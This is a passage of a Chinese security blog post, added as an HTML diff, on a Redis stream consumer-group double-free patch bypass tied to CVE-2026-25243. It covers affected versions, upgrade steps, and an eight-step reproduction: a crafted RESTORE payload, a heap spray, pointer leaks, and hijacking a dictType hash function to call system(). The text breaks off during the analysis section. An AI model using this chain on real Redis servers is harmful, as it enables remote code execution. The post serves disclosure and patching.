@@ -1,0 +1,524 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="梳理 CVE-2026-25243 原始修复中跨消费者 NACK 共享检查缺失导致的 double free 补丁绕过、影响版本、复现链路、排查方法与临时缓解措施。"><meta name="theme-color" content="#f5f2eb"><title>Redis Stream Consumer Group NACK Double Free 补丁绕过漏洞（Authenticated RCE） — hongzh0's Blog</title>
+<link rel="canonical" href="https://hongzh0.wiki/posts/redis-stream-nack-double-free-bypass.html"><link rel="alternate" type="application/rss+xml" title="hongzh0's Blog RSS" href="/feed.xml"><link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<meta property="og:type" content="article"><meta property="og:locale" content="zh_CN"><meta property="og:site_name" content="hongzh0's Blog"><meta property="og:title" content="Redis Stream Consumer Group NACK Double Free 补丁绕过漏洞（Authenticated RCE）"><meta property="og:description" content="梳理 CVE-2026-25243 原始修复中跨消费者 NACK 共享检查缺失导致的 double free 补丁绕过、影响版本、复现链路、排查方法与临时缓解措施。"><meta property="og:url" content="https://hongzh0.wiki/posts/redis-stream-nack-double-free-bypass.html"><meta property="og:image" content="https://hongzh0.wiki/assets/portrait-c47a226a5fdc9058ab5ee435ce6f0352.jpg"><meta property="og:image:alt" content="hongzh0 的个人照片"><meta property="og:image:width" content="960"><meta property="og:image:height" content="960"><meta property="article:published_time" content="2026-07-23T03:46:39.000Z">
+<meta name="twitter:card" content="summary"><meta name="twitter:title" content="Redis Stream Consumer Group NACK Double Free 补丁绕过漏洞（Authenticated RCE）"><meta name="twitter:description" content="梳理 CVE-2026-25243 原始修复中跨消费者 NACK 共享检查缺失导致的 double free 补丁绕过、影响版本、复现链路、排查方法与临时缓解措施。"><meta name="twitter:image" content="https://hongzh0.wiki/assets/portrait-c47a226a5fdc9058ab5ee435ce6f0352.jpg"><meta name="twitter:image:alt" content="hongzh0 的个人照片">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Redis Stream Consumer Group NACK Double Free 补丁绕过漏洞（Authenticated RCE）","description":"梳理 CVE-2026-25243 原始修复中跨消费者 NACK 共享检查缺失导致的 double free 补丁绕过、影响版本、复现链路、排查方法与临时缓解措施。","image":"https://hongzh0.wiki/assets/portrait-c47a226a5fdc9058ab5ee435ce6f0352.jpg","datePublished":"2026-07-23T03:46:39.000Z","dateModified":"2026-07-23T03:46:39.000Z","inLanguage":"zh-CN","mainEntityOfPage":"https://hongzh0.wiki/posts/redis-stream-nack-double-free-bypass.html","url":"https://hongzh0.wiki/posts/redis-stream-nack-double-free-bypass.html","author":{"@type":"Person","name":"hongzh0","url":"https://hongzh0.wiki/about.html"},"publisher":{"@type":"Person","name":"hongzh0"}}</script><link rel="stylesheet" href="/assets/fonts/font-face.css?v=2822c22d651c"><link rel="stylesheet" href="../assets/style.css?v=2822c22d651c"><script>try{const saved=localStorage.getItem('theme');const theme=saved==='dark'||saved==='light'?saved:(matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');const color=theme==='dark'?'#1b1d19':'#f5f2eb';document.documentElement.dataset.theme=theme;document.documentElement.style.colorScheme=theme;document.querySelector('meta[name="theme-color"]')?.setAttribute('content',color)}catch{document.documentElement.dataset.theme='light';document.documentElement.style.colorScheme='light'}</script></head><body>
+<div class="reading-progress" aria-hidden="true"><span></span></div><a class="skip-link" href="#article">跳到正文</a><header class="site-header"><a class="brand" href="../index.html"><img class="brand-avatar" src="/assets/avatar-72.webp" srcset="/assets/avatar-72.webp 72w, /assets/avatar-128.webp 128w" sizes="36px" alt="" width="36" height="36" decoding="async"><span>hongzh0's Blog</span></a><button type="button" class="menu-toggle" aria-label="打开导航" aria-controls="site-navigation" aria-expanded="false"><span aria-hidden="true"></span><span aria-hidden="true"></span></button><nav class="site-nav" id="site-navigation" aria-label="主导航"><a href="../index.html">首页</a><a href="../archive.html">归档</a><a href="../links.html">友链</a><a href="../about.html">关于</a><button type="button" class="theme-toggle" aria-label="切换深浅色主题" aria-pressed="false"><span class="sun" aria-hidden="true">☼</span><span class="moon" aria-hidden="true">◐</span></button></nav></header>
+<main id="main"><section class="article-hero wrap"><header class="article-header"><a class="article-breadcrumb" href="../archive.html"><span aria-hidden="true">←</span> 文章归档 / 漏洞速报</a><div class="post-meta"><span>漏洞速报</span><time datetime="2026-07-23T03:46:39.000Z">2026.07.23</time><span>28 分钟阅读</span><span class="post-badge">定风波Agent复现</span></div><h1>Redis Stream Consumer Group NACK Double Free 补丁绕过漏洞（Authenticated RCE）</h1><p class="article-lead">梳理 CVE-2026-25243 原始修复中跨消费者 NACK 共享检查缺失导致的 double free 补丁绕过、影响版本、复现链路、排查方法与临时缓解措施。</p><dl class="article-facts"><div><dt>PUBLISHED</dt><dd>2026.07.23</dd></div><div><dt>READING</dt><dd>28 MIN</dd></div><div><dt>SECTIONS</dt><dd>08</dd></div><div><dt>VIEWS</dt><dd id="busuanzi_page_pv">—</dd></div></dl></header>
+<div class="featured-visual article-cover"><span class="visual-grid" aria-hidden="true"></span><span class="visual-orbit orbit-one" aria-hidden="true"></span><span class="visual-orbit orbit-two" aria-hidden="true"></span><span class="visual-center" data-cover-length="5" aria-hidden="true">Redis</span><span class="visual-caption" aria-hidden="true">SECURITY RESEARCH · 2026-07-23</span></div></section>
+<details class="mobile-toc wrap"><summary><span>文章目录</span><small>08 SECTIONS</small></summary><nav aria-label="移动端文章目录"><a href="#section-1-基本信息-1">1. 基本信息</a><a class="toc-h3" href="#section-受影响版本-2">受影响版本</a><a href="#section-2-漏洞描述-3">2. 漏洞描述</a><a href="#section-3-修复方案-4">3. 修复方案</a><a class="toc-h3" href="#section-官方修复-5">官方修复</a><a class="toc-h3" href="#section-参考链接表-6">参考链接表</a><a href="#section-4-漏洞复现-7">4. 漏洞复现</a><a href="#section-5-漏洞分析-8">5. 漏洞分析</a><a href="#section-6-攻击调查-9">6. 攻击调查</a><a class="toc-h3" href="#section-日志检查-10">日志检查</a><a class="toc-h3" href="#section-流量检查-11">流量检查</a><a class="toc-h3" href="#section-入侵痕迹检查-12">入侵痕迹检查</a><a href="#section-7-自查方法-13">7. 自查方法</a><a class="toc-h3" href="#section-版本检查-14">版本检查</a><a class="toc-h3" href="#section-命令权限检查-15">命令权限检查</a><a class="toc-h3" href="#section-非破坏性自查-16">非破坏性自查</a><a href="#section-8-临时缓解-17">8. 临时缓解</a><a class="toc-h3" href="#section-缓解措施-使用-acl-禁用-restore-命令-18">缓解措施： 使用 ACL 禁用 RESTORE 命令</a><a class="toc-h3" href="#section-缓解措施局限性说明-19">缓解措施局限性说明</a></nav></details><div class="article-layout" id="article"><aside class="article-toc" aria-label="文章目录"><div class="article-toc-head"><span>CONTENTS</span><small>08 SECTIONS</small></div><nav class="article-toc-nav"><a href="#section-1-基本信息-1">1. 基本信息</a><a class="toc-h3" href="#section-受影响版本-2">受影响版本</a><a href="#section-2-漏洞描述-3">2. 漏洞描述</a><a href="#section-3-修复方案-4">3. 修复方案</a><a class="toc-h3" href="#section-官方修复-5">官方修复</a><a class="toc-h3" href="#section-参考链接表-6">参考链接表</a><a href="#section-4-漏洞复现-7">4. 漏洞复现</a><a href="#section-5-漏洞分析-8">5. 漏洞分析</a><a href="#section-6-攻击调查-9">6. 攻击调查</a><a class="toc-h3" href="#section-日志检查-10">日志检查</a><a class="toc-h3" href="#section-流量检查-11">流量检查</a><a class="toc-h3" href="#section-入侵痕迹检查-12">入侵痕迹检查</a><a href="#section-7-自查方法-13">7. 自查方法</a><a class="toc-h3" href="#section-版本检查-14">版本检查</a><a class="toc-h3" href="#section-命令权限检查-15">命令权限检查</a><a class="toc-h3" href="#section-非破坏性自查-16">非破坏性自查</a><a href="#section-8-临时缓解-17">8. 临时缓解</a><a class="toc-h3" href="#section-缓解措施-使用-acl-禁用-restore-命令-18">缓解措施： 使用 ACL 禁用 RESTORE 命令</a><a class="toc-h3" href="#section-缓解措施局限性说明-19">缓解措施局限性说明</a></nav></aside><article class="article-content"><blockquote>
+<p><strong>实验声明：</strong> 本文仅记录授权测试环境中的漏洞复现与分析过程，相关命令和 PoC 仅用于自有资产验证、加固与应急排查。</p>
+</blockquote>
+<h2 id="section-1-基本信息-1">1. 基本信息</h2>
+<ul>
+<li><strong>原始漏洞编号:</strong> CVE-2026-25243(本漏洞是基于此漏洞的绕过)</li>
+<li><strong>CWE 分类:</strong> NVD 官方分类为 CWE-122 (Heap-based Buffer Overflow)；技术分析表明根因为 CWE-415 (Double Free) / CWE-416 (Use After Free)</li>
+<li><strong>CVSS 3.1 评分:</strong> 8.8 (HIGH) — Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</li>
+<li><strong>CVSS 4.0 评分:</strong> 7.7 (High) — Vector: CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N（来源：GitHub CNA）</li>
+<li><strong>漏洞类型:</strong> 远程代码执行</li>
+<li><strong>适用操作系统:</strong> Linux (x86_64)</li>
+<li><strong>出站连接:</strong> 否</li>
+<li><strong>公开 PoC:</strong> 是（<a href="https://github.com/berabuddies/redis-poc">berabuddies/redis-poc</a>）</li>
+<li><strong>发现者:</strong> @shouc (berabuddies)，基于 Emil Lerner (@emil_lerner) 和 Joseph Surin 的原始发现</li>
+<li><strong>披露日期:</strong> 2026-07-22</li>
+</ul>
+<h3 id="section-受影响版本-2">受影响版本</h3>
+<p><strong>受影响版本（部分已确认受此绕过影响，注有例外）：</strong></p>
+<ul>
+<li>Redis 6.2.22（docker: redis:6.2.22）</li>
+<li>Redis 7.4.9（docker: redis:7.4，注：PoC 在此版本上 PIE/libc 泄漏和 dictType 毒化均成功，但 trigger 阶段失败——ERR unknown command；推测受影响但仍待独立验证 trigger 失败原因）</li>
+<li>Redis 8.6.4（docker: redis:8.6）</li>
+</ul>
+<p><strong>受影响版本判断规则：</strong> 原始修复仅阻止了同一消费者 PEL 中的重复 rawid，未检查跨消费者 NACK 共享场景。经 PoC 验证，6.2.22 和 8.6.4 确认受此绕过影响（RCE CONFIRMED），7.4.9 疑似受影响（PoC 部分成功但 trigger 失败）。其他接收了 CVE-2026-25243 原始修复的版本（7.2.14、8.2.6、8.4.3）尚未验证，理论上可能存在相同风险。</p>
+<p><strong>不受影响的版本：</strong></p>
+<ul>
+<li>Redis 8.8.0 及以上版本（PR #15081 重构已合入）</li>
+<li>未应用 CVE-2026-25243 修复的旧版本（漏洞向量不同，但同样存在原始 double-free 风险）</li>
+</ul>
+<p><strong>原始 CVE-2026-25243 受影响版本范围（供参考）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>发布系列</th>
+<th>CVE-2026-25243 影响范围</th>
+<th>声称修复版本</th>
+<th>此绕过是否仍影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Redis 6.2.x</td>
+<td>6.2.0 - 6.2.21</td>
+<td>6.2.22</td>
+<td><strong>是 — 6.2.22 仍受影响</strong></td>
+</tr>
+<tr>
+<td>Redis 7.2.x</td>
+<td>7.2.0 - 7.2.13</td>
+<td>7.2.14</td>
+<td>待验证</td>
+</tr>
+<tr>
+<td>Redis 7.4.x</td>
+<td>7.4.0 - 7.4.8</td>
+<td>7.4.9</td>
+<td><strong>是 — 7.4.9 疑似受影响（PoC trigger 失败，详见复现章节）</strong></td>
+</tr>
+<tr>
+<td>Redis 8.2.x</td>
+<td>8.2.0 - 8.2.5</td>
+<td>8.2.6</td>
+<td>待验证</td>
+</tr>
+<tr>
+<td>Redis 8.4.x</td>
+<td>8.4.0 - 8.4.2</td>
+<td>8.4.3</td>
+<td>待验证</td>
+</tr>
+<tr>
+<td>Redis 8.6.x</td>
+<td>8.6.0 - 8.6.2</td>
+<td>8.6.3（注：8.6.4 为后续发布，但绕过仍可利用）</td>
+<td><strong>是 — 8.6.4 仍受影响</strong></td>
+</tr>
+<tr>
+<td>Redis 8.8.x</td>
+<td>N/A</td>
+<td>N/A</td>
+<td><strong>否 — 不受影响</strong></td>
+</tr>
+</tbody></table>
+<h2 id="section-2-漏洞描述-3">2. 漏洞描述</h2>
+<p>Redis 是一个开源的内存数据结构存储系统，广泛用作数据库、缓存、消息代理和流处理引擎。Redis Stream 是 Redis 5.0 引入的持久化消息队列数据结构，支持消费者组 (Consumer Group) 机制，允许多个消费者协同消费流中的消息。每个消费者组维护一个全局 PEL (Pending Entries List) 和每个消费者的私有 PEL，两者均指向相同的 streamNACK 对象以跟踪未确认的消息。</p>
+<p>此漏洞是 CVE-2026-25243 原始补丁的不完全绕过。原始漏洞中，通过 RESTORE 命令反序列化特制的 RDB 数据时，stream consumer PEL 加载逻辑 (src/rdb.c) 未检查同一消费者的 PEL 中是否已存在相同 rawid 的 streamNACK，导致同一 streamNACK 被释放两次 (double free)。Redis 在 6.2.22 / 7.4.9 / 8.6.3 等版本中发布的补丁 (commit 47c51369) 添加了同一消费者 PEL 内的重复 rawid 检查。然而，该补丁遗漏了跨消费者场景：当两个不同的消费者 (Consumer A 和 Consumer B) 的 PEL 指向同一个 streamNACK 对象时，补丁不会阻止这种状态的形成。攻击者通过 RESTORE 命令加载特制的 stream 数据，构造出两个消费者的 PEL 共享同一 streamNACK 的非法状态，然后依次调用 XGROUP DELCONSUMER 删除这两个消费者：第一次删除触发 streamFreeNACK 释放 NACK，第二次删除对同一块内存再次调用 streamFreeNACK，造成 double free。据 GDB 跟踪记录和 PoC 仓库代码分析，攻击者利用 jemalloc tcache bin poisoning 技术精确控制堆内存布局，通过伪造 dict entry、构建任意读写原语，最终劫持 dictType 结构体将 hashFunction 指针替换为 system() 函数地址，可实现以 redis 用户权限执行系统命令的远程代码执行（已验证 id 等命令，原理上支持任意系统命令）。</p>
+<h2 id="section-3-修复方案-4">3. 修复方案</h2>
+<h3 id="section-官方修复-5">官方修复</h3>
+<p><strong>重要说明：</strong> 截至 2026-07-22，Redis 官方尚未针对此绕过漏洞发布独立安全公告。以下修复方案基于已验证的可阻断此攻击向量的版本和补丁。</p>
+<p><strong>推荐升级至 Redis 8.8.0 或更高版本：</strong></p>
+<p><strong>PR #15081 版本历史说明：</strong> PR #15081 的初始版本已于 2026-04-23 合入 unstable 分支并包含在 Redis 8.6.4 中，添加了跨消费者 NACK 共享的基础检查。但此初始版本在 stream consumer PEL 重构方面不完整——PoC 仓库已验证 8.6.4 仍可通过绕过利用。PR #15081 的后续重构版本（合入 8.8.0）从根本上重写了 stream consumer PEL 的加载逻辑，完全阻断了跨消费者 NACK 共享的所有已知路径。Redis 8.8.0 及以上版本经确认不受此绕过影响。</p>
+<ul>
+<li><strong>Security Advisory URL（原始 CVE-2026-25243）:</strong> <a href="https://redis.io/blog/security-advisory-cve202623479-cve202625243-cve-2026-25588-cve202625589-cve-2026-23631/">https://redis.io/blog/security-advisory-cve202623479-cve202625243-cve-2026-25588-cve202625589-cve-2026-23631/</a></li>
+<li><strong>绕过漏洞独立公告:</strong> 暂无 — 此漏洞为 0-day，截至文档撰写时 Redis 官方尚未发布针对此绕过的独立安全公告</li>
+<li><strong>阻断此绕过的 Fix Commit (PR #15081):</strong> <a href="https://github.com/redis/redis/pull/15081">https://github.com/redis/redis/pull/15081</a></li>
+<li><strong>原始 CVE-2026-25243 stream NACK 修复 Commit:</strong> <a href="https://github.com/redis/redis/commit/47c51369eeffd55e1baf20df7955a3dfbe842fc4%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%8C%E5%B7%B2%E8%A2%AB%E7%BB%95%E8%BF%87%EF%BC%9Bhash">https://github.com/redis/redis/commit/47c51369eeffd55e1baf20df7955a3dfbe842fc4（不完整，已被绕过；hash</a> 来源：ZeroDay.cloud 深度分析文章）</li>
+<li><strong>原始 CVE-2026-25243 zipmap 修复 Commit:</strong> <a href="https://github.com/redis/redis/commit/c77d60d6b8c0dfa67b938ea50929ffb1661612df%EF%BC%88hash">https://github.com/redis/redis/commit/c77d60d6b8c0dfa67b938ea50929ffb1661612df（hash</a> 来源：ZeroDay.cloud 深度分析文章）</li>
+<li><strong>修复版本下载 (8.8.0):</strong> <a href="https://github.com/redis/redis/releases/tag/8.8.0">https://github.com/redis/redis/releases/tag/8.8.0</a></li>
+</ul>
+<p><strong>可执行升级命令：</strong></p>
+<p>使用 Docker 部署的 Redis 实例：</p>
+<pre><code class="language-bash"># 停止当前容器
+docker stop &lt;redis-container-name&gt;
+
+# 拉取 Redis 8.8.0 镜像
+docker pull redis:8.8.0
+
+# 使用新镜像重新启动（保留数据卷挂载）
+docker run -d --name &lt;redis-container-name&gt; \
+  -v &lt;redis-data-path&gt;:/data \
+  -p 6379:6379 \
+  redis:8.8.0 redis-server --appendonly yes
+
+# 或使用 docker-compose
+# 修改 docker-compose.yml 中 image 为 redis:8.8.0，然后执行：
+docker-compose down &amp;&amp; docker-compose up -d
+</code></pre>
+<p>使用 APT 包管理器（Debian/Ubuntu）：</p>
+<pre><code class="language-bash"># 添加 Redis 官方仓库后执行（注：8.8.0 为较新版本，请根据仓库实际包名调整版本号）
+sudo apt-get update
+sudo apt-get install redis-server=8.8.0-1   # 或 redis=8.8.0，依仓库包名而定
+sudo systemctl restart redis-server
+</code></pre>
+<p>从源码编译安装：</p>
+<pre><code class="language-bash">wget https://github.com/redis/redis/archive/refs/tags/8.8.0.tar.gz
+tar xzf 8.8.0.tar.gz
+cd redis-8.8.0
+make -j$(nproc)
+sudo make install
+sudo systemctl restart redis-server
+</code></pre>
+<h3 id="section-参考链接表-6">参考链接表</h3>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>URL</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>原始 CVE-2026-25243 Advisory</td>
+<td><a href="https://redis.io/blog/security-advisory-cve202623479-cve202625243-cve-2026-25588-cve202625589-cve-2026-23631/">https://redis.io/blog/security-advisory-cve202623479-cve202625243-cve-2026-25588-cve202625589-cve-2026-23631/</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>GitHub Security Advisory (GHSA)</td>
+<td><a href="https://github.com/redis/redis/security/advisories/GHSA-c8h9-259x-jff4">https://github.com/redis/redis/security/advisories/GHSA-c8h9-259x-jff4</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>NVD 记录</td>
+<td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25243">https://nvd.nist.gov/vuln/detail/CVE-2026-25243</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>CVE.org 记录</td>
+<td><a href="https://www.cve.org/CVERecord?id=CVE-2026-25243">https://www.cve.org/CVERecord?id=CVE-2026-25243</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>原始漏洞深度分析</td>
+<td><a href="https://www.zeroday.cloud/blog/redis-cve-2026-25243-deep-dive">https://www.zeroday.cloud/blog/redis-cve-2026-25243-deep-dive</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>绕过漏洞技术分析</td>
+<td><a href="https://zerotistic.blog/posts/redis-stream-pel-uaf/">https://zerotistic.blog/posts/redis-stream-pel-uaf/</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>公开 PoC 仓库</td>
+<td><a href="https://github.com/berabuddies/redis-poc">https://github.com/berabuddies/redis-poc</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>原始 stream NACK 修复 Commit</td>
+<td><a href="https://github.com/redis/redis/commit/47c51369eeffd55e1baf20df7955a3dfbe842fc4">https://github.com/redis/redis/commit/47c51369eeffd55e1baf20df7955a3dfbe842fc4</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>原始 zipmap 修复 Commit</td>
+<td><a href="https://github.com/redis/redis/commit/c77d60d6b8c0dfa67b938ea50929ffb1661612df">https://github.com/redis/redis/commit/c77d60d6b8c0dfa67b938ea50929ffb1661612df</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>阻断绕过的 PR #15081</td>
+<td><a href="https://github.com/redis/redis/pull/15081">https://github.com/redis/redis/pull/15081</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>Redis 8.8.0 修复版本</td>
+<td><a href="https://github.com/redis/redis/releases/tag/8.8.0">https://github.com/redis/redis/releases/tag/8.8.0</a></td>
+<td>已验证</td>
+</tr>
+<tr>
+<td>Redis 8.8.0 发布说明</td>
+<td><a href="https://redis.io/docs/latest/operate/oss_and_stack/stack-with-enterprise/release-notes/redisce/redisos-8.8-release-notes/">https://redis.io/docs/latest/operate/oss_and_stack/stack-with-enterprise/release-notes/redisce/redisos-8.8-release-notes/</a></td>
+<td>已验证</td>
+</tr>
+</tbody></table>
+<h2 id="section-4-漏洞复现-7">4. 漏洞复现</h2>
+<p><strong>目标版本:</strong> Redis 6.2.22 / 8.6.4（官方 Docker 镜像）</p>
+<p><strong>环境设置:</strong></p>
+<ul>
+<li>操作系统: Linux x86_64</li>
+<li>快速启动目标: <code>docker run -d --name redis-target -p 6379:6379 redis:6.2.22</code></li>
+<li>前提条件: Redis 配置中 sanitize-dump-payload 为默认值 no；攻击者拥有认证凭据（任意密码即可）</li>
+<li>PoC 环境: Python 3 + redis-py + libcrc64.so (需编译 crc64.c / crcspeed.c)</li>
+</ul>
+<p><strong>步骤 1: 准备 exploit 环境</strong></p>
+<p>从 PoC 仓库克隆代码并编译 CRC64 库：</p>
+<pre><code class="language-bash">git clone https://github.com/berabuddies/redis-poc
+cd redis-poc
+gcc -shared -fPIC -O2 -o libcrc64.so crc64.c crcspeed.c
+pip install redis
+</code></pre>
+<p><strong>步骤 2: 构造共享 NACK 的恶意 RDB 数据</strong></p>
+<p>exploit 通过 Python 脚本构造一个特殊的 RDB 序列化流数据，其中两个消费者 (Consumer A 和 Consumer B) 的 PEL 共享同一个 streamNACK。在正常的 Redis Stream 操作中，此状态不可能出现 — 每个 streamNACK 仅属于一个消费者。exploit 通过直接操作 RDB 二进制数据（绕过正常的 XACK/XREADGROUP 逻辑）来创建此非法状态。</p>
+<p>exploit 使用以下核心逻辑构造 RDB 数据（来自 A_lib.py）：</p>
+<pre><code class="language-bash"># 伪代码描述（实际代码参见 PoC 仓库）:
+# 1. 创建 stream key 和 consumer group
+# 2. 使用 DEBUG RELOAD 或直接操作生成 type-15 stream 的序列化数据
+# 3. 修改消费者 PEL 使其包含指向同一 streamNACK 的引用
+# 4. 重新计算 CRC64 校验和
+# 5. 通过 RESTORE 命令将恶意数据加载到 Redis
+</code></pre>
+<p>对应的 Redis 命令序列：</p>
+<pre><code class="language-bash">RESTORE stream_key 0 &lt;hex-encoded-rdb-payload&gt; REPLACE
+XGROUP CREATE stream_key group_A $ MKSTREAM
+XGROUP CREATECONSUMER stream_key group_A consumer_A
+XGROUP CREATECONSUMER stream_key group_A consumer_B
+</code></pre>
+<p><strong>步骤 3: 触发 Double Free</strong></p>
+<p>依次删除两个消费者，触发两次释放同一 streamNACK：</p>
+<pre><code class="language-bash"># 第一次删除 Consumer A → streamFreeNACK(nack) — NACK 被释放
+XGROUP DELCONSUMER stream_key group_A consumer_A
+
+# 第二次删除 Consumer B → streamFreeNACK(nack) — 同一 NACK 再次被释放 (Double Free)
+XGROUP DELCONSUMER stream_key group_A consumer_B
+</code></pre>
+<p>在 jemalloc 内存分配器中，被释放的 64 字节 (streamNACK 大小) chunk 进入 tcache bin。由于同一 chunk 在 tcache freelist 中出现两次，后续两次分配将返回同一地址。</p>
+<p><strong>步骤 4: 堆喷 (Heap Spray) 与内存布局操纵</strong></p>
+<p>利用 22 字符键名或 APPEND 操作分配内存，使新分配的 dict 结构体占据被释放的 streamNACK 内存槽位：</p>
+<pre><code class="language-bash"># jemalloc tcache flush — 分配/释放临时字符串以清空 tcache
+for i in range(512):
+    SETEX tmp_key_{i} 1 x
+
+# 堆喷 — 分配 dict 对象占据 NACK 释放的内存
+for i in range(spray_count):
+    HSET spray_{i} k v
+</code></pre>
+<p><strong>步骤 5: 信息泄露 (PIE/Heap 地址)</strong></p>
+<p>通过 XINFO 或 XPENDING 命令读取已被 dict 回收的 streamNACK 槽位中的残留指针数据：</p>
+<pre><code class="language-bash"># 读取已被 dict 覆盖的 NACK 字段
+# streamNACK.delivery_time 偏移 +0 → dict.type (PIE 指针)
+# streamNACK.delivery_count 偏移 +8 → dict.ht_table[0] (堆指针)
+XINFO STREAM stream_key FULL
+</code></pre>
+<p>在 Redis 8.6 中，streamNACK 和 dict 结构体均在 jemalloc 64 字节 size class 中，字段布局完美对齐。exploit 从 XINFO 输出中提取 PIE 基址和堆地址。</p>
+<p><strong>步骤 6: 构建任意读写原语</strong></p>
+<p>利用 pelListUnlink 链表中操作实现受控的任意地址写入，进而构建 fake dict entry 和 fake hash table：</p>
+<pre><code class="language-bash"># 构建包含受控指针的 fake RAW robj
+SET fake_robj_buf &lt;controlled_binary_data&gt;
+SETRANGE fake_robj_buf &lt;offset&gt; &lt;pointer_bytes&gt;
+
+# 通过 SETRANGE 修改 dict-&gt;ht_table[0] 指向 fake hash table
+# 通过 GETRANGE 读取 fake hash table entry 指向的任意内存
+# 此阶段实现有界任意读写
+</code></pre>
+<p><strong>步骤 7: 利用链收尾 — 获取 RCE</strong></p>
+<p>（以下利用链细节来自 PoC 作者 GDB 跟踪记录，尚未独立复现——详见信息可信度说明表&quot;推断&quot;行）</p>
+<pre><code class="language-bash"># 阶段 A: 泄露 PIE 基址（通过 Lua tostring(string.format) CClosure）
+# 阶段 B: 泄露 libc 基址（通过 write@GOT 读取）
+# 阶段 C: 定位 db[i].dict 或 server.commands 结构体地址
+# 阶段 D: 将 dict-&gt;type 指针重定向至堆上的 fake dictType
+#         fake dictType.hashFunction = system() 函数地址
+# 阶段 E: 触发 dictFind → hashFunction(key) → system(key)
+GET &quot;&lt;shell_command&gt;&quot;
+# system() 被调用，fork/exec 执行命令，输出写入 /tmp/pwned*
+#
+# GDB 跟踪确认 (来自 PoC 作者):
+# [dictFind] dict=0x...b600  type=0x...b1a0(FAKE in heap BUF)
+#   hashFunction=0x...a490(system@libc)
+# [RCE!] system(&quot;id &gt; /tmp/pwned_gdb&quot;) called
+# [Detaching after vfork from child process 3327]  ← system() fork/exec 确认
+</code></pre>
+<p><strong>步骤 8: 恢复服务正常运行</strong></p>
+<p>据 PoC 作者声明（HARDENING.md），exploit 在获取 RCE 后将 dict-&gt;type 指针恢复为原始值，确保 Redis 服务在攻击后继续正常运行（此项为推断）：</p>
+<pre><code class="language-bash"># 恢复原始 type 指针
+SETRANGE fake_robj_buf &lt;dict_type_offset&gt; &lt;original_type_ptr&gt;
+# Redis 完全正常运行，# 无崩溃、无异常日志
+</code></pre>
+<p><strong>PoC 验证结果（实测）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>Docker 镜像</th>
+<th>状态</th>
+<th>RCE 输出</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>6.2.22</td>
+<td>redis:6.2.22</td>
+<td>CONFIRMED</td>
+<td>uid=999(redis) gid=999(redis)</td>
+</tr>
+<tr>
+<td>8.6.4</td>
+<td>redis:8.6</td>
+<td>CONFIRMED</td>
+<td>uid=999(redis) gid=999(redis)</td>
+</tr>
+<tr>
+<td>7.4.9</td>
+<td>redis:7.4</td>
+<td>LEAKS OK, TRIGGER FAILED</td>
+<td>Docker tag 可能非精确 7.4.9</td>
+</tr>
+</tbody></table>
+<h2 id="section-5-漏洞分析-8">5. 漏洞分析</h2>
+<p><strong>攻击路径:</strong> TCP 6379（Redis 默认端口），通过经过认证的 Redis 连接发送一系列命令（RESTORE、XGROUP DELCONSUMER、SET、GET、SETEX、APPEND、DEL、DEBUG OBJECT、XPENDING、XINFO、GETRANGE、SETRANGE、CONFIG SET、SELECT、EVAL）</p>
+<p><strong>适用操作系统:</strong> Linux x86_64（依赖 glibc 和 jemalloc 特定行为）</p>
+<p><strong>出站连接:</strong> 否（利用全程在 Redis 进程内完成，不需连接外部服务器）</p>
+<p><strong>漏洞位置:</strong></p>
+<ul>
+<li>核心缺陷文件: <code>src/rdb.c</code> — stream consumer PEL 反序列化逻辑 (rdbLoadStreamPEL 或等效函数)</li>
+<li>利用涉及的结构体: <code>streamNACK</code> (定义于 <code>src/stream.h</code>)、<code>dict</code> / <code>dictEntry</code> / <code>dictType</code> (定义于 <code>src/dict.h</code>)</li>
+<li>Redis 8.6 中 streamNACK 大小增至 64 字节 (commit cecdc9987)，与 dict 共享 jemalloc size class</li>
+</ul>
+<p><strong>根本原因:</strong></p>
+<p>CVE-2026-25243 原始补丁 (commit 47c51369eeffd55e1baf20df7955a3dfbe842fc4) 在 src/rdb.c 的 stream consumer PEL 反序列化函数中添加了同一消费者 PEL 内重复 rawid 的检查，阻止了单个消费者 PEL 中出现重复条目。然而，该补丁未检查以下跨消费者场景：Consumer A 和 Consumer B 的 PEL 可以指向同一个 streamNACK 对象。原始补丁的逻辑假设每个 streamNACK 仅属于一个消费者，但此假设在恶意构造的 RDB 数据下不成立。攻击者通过在序列化数据中构造两个消费者的 PEL 共享同一 NACK 的状态，绕过了原始补丁的保护。补丁的不完整性体现在：它只修复了&quot;同一消费者 PEL 内重复&quot;这一种不变量违反，但未修复&quot;跨消费者 NACK 共享&quot;这一更深层的不变量违反。</p>
+<p><strong>利用前提条件:</strong></p>
+<ul>
+<li>经过认证的 Redis 访问（任意密码即可，不需要特殊 ACL 权限）</li>
+<li>攻击者能执行以下命令: EVAL, RESTORE, XGROUP, SET, GET, SETEX, APPEND, DEL, DEBUG OBJECT, XPENDING, XINFO, GETRANGE, SETRANGE, CONFIG SET, SELECT</li>
+<li>Redis 配置 sanitize-dump-payload 为 no（默认值）</li>
